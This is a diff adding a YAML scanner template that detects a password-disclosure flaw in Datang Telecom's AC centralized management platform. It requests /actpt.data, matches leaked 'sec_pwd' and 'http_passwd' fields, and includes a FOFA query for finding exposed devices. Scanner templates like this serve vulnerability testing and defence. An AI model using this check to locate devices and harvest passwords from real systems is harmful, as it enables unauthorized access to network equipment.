@@ -1,0 +1,24 @@
+id: datang-ac-disclosure
+
+info:
+  name: 大唐电信AC集中管理平台信息泄漏
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    页面搜一下sec_pwd，有可能会暴露密码信息
+    FOFA: app="大唐电信AC集中管理平台"
+  tags: datang,disclosure
+  created: 2023/10/29
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /actpt.data
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b'"sec_pwd":') &&
+      response.body.bcontains(b'"http_passwd":') &&
+      response.body.bcontains(b'"user_info":')
+expression: r0()
